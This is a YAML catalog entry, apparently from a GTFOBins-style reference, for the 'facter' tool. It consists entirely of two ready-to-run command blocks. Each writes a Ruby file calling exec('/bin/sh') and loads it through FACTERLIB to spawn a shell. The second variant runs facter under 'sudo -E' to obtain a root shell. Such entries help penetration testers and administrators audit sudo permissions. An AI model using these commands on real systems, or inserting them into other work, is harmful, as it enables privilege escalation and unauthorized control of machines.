---
functions:
  execute-interactive:
    - code: |
        TF=$(mktemp -d)
        echo 'exec("/bin/sh")' > $TF/x.rb
        FACTERLIB=$TF facter
  sudo-enabled:
    - code: |
        TF=$(mktemp -d)
        echo 'exec("/bin/sh")' > $TF/x.rb
        FACTERLIB=$TF sudo -E facter
---
